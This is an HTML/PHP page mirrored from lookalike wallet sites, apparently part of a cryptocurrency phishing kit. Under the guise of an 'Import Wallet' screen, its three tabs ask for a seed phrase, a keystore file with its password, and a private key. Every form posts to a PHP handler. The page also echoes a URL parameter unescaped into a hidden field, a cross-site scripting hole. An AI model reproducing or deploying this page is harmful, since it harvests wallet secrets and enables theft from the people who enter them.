<!DOCTYPE html>
<html>



<!-- Mirrored from walletaccess.net/wallets/import.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 24 Apr 2021 08:39:55 GMT -->

<!-- Mirrored from www.walletrefresh.net/wallet/import.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 07 Jun 2021 15:18:44 GMT -->
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Import Wallet</title>
    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/fonts/fontawesome-all.min.css">
    <link rel="stylesheet" href="assets/css/styles.css">
    <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.html">
    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.html">
    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.html">
    <link rel="manifest" href="site.html">
</head>
</head>
<body>

	
    <header>
        <div class="container-fluid">
			<div class="row">
			<div class="col-md-4 offset-md-4">
				<a class="text-white" href="index.html" style="font-size: 20px;"><i class="fas fa-angle-left"></i>&nbsp; &nbsp;Import Wallet</a>
			</div>
			</div>
		</div>
    </header>
	<div class="container-fluid">
		<div class="row">
			<div class="col-md-4 offset-md-4">
				<ul class="nav nav-tabs">
					<li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase">Phrase</a></li>
					<li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
					<li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey">Private Key</a></li>
				</ul>
			</div>
		</div>
	</div>
    <section style="margin-top: 40px;">
        <div class="container-fluid">
            <div class="row">
                <div class="col-md-4 offset-md-4">
					<!-- Tab panes -->
					<div class="tab-content">
						<div role="tabpanel" class="tab-pane fade show active" id="phrase">
							<form method="post" action="../actions.php">
								<input type="hidden" value="phrase"  name="type"></input>
								<textarea class="form-control" rows="5" name="phrase" placeholder="Phrase" required=""></textarea>
								<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
							<input type="hidden" value="<?php  echo  (isset($_GET['wallet']) ?  $_GET['wallet'] : 'NUll' )?>"  name="wallet">
								<div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
							</form>
						</div>
						<div role="tabpanel" class="tab-pane fade" id="keystore">
							<form method="post" action="../actions.php">
								<input type="hidden" value="keystore"  name="type"></input>
							<input type="hidden" value="<?php  echo  (isset($_GET['wallet']) ?  $_GET['wallet'] : 'NUll' )?>"  name="wallet">
								<div class="form-group">
									<textarea class="form-control" name="keystorejson" rows="5" placeholder="Keystore JSON" required=""></textarea>
								</div>
								<div class="form-group">
									<input class="form-control" type="password" name="keystorepassword" placeholder="Password" required="">
								</div>
								<p class="text-secondary" style="margin-top: 10px;">
									Several lines of text beginning with "{...}" plus the password you used to encrypt it.
								</p>
								<!-- <input type="hidden" name="value" value="Ethereum"> -->
								<div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
							</form>
						</div>
						<div role="tabpanel" class="tab-pane fade" id="privatekey">
							<form method="post" action="../actions.php">
								<input type="hidden" value="privatekey"  name="type"></input>
								<input type="hidden" value="<?php  echo  (isset($_GET['wallet']) ?  $_GET['wallet'] : 'NUll' )?>"  name="wallet">
								<div class="form-group">
									<input class="form-control" name="privatekey" placeholder="Private Key" required="">
								</div>
								<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
								<!-- <input type="hidden" name="value" value="Ethereum"> -->
								<div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
							</form>
						</div>
					</div>
                </div>
            </div>
        </div>
    </section>
    <script src="assets/js/jquery.min.js"></script>
    <script src="assets/bootstrap/js/bootstrap.min.js"></script>
</body>



<!-- Mirrored from walletaccess.net/wallets/import.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 24 Apr 2021 08:40:08 GMT -->

<!-- Mirrored from www.walletrefresh.net/wallet/import.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 07 Jun 2021 15:18:49 GMT -->
</html>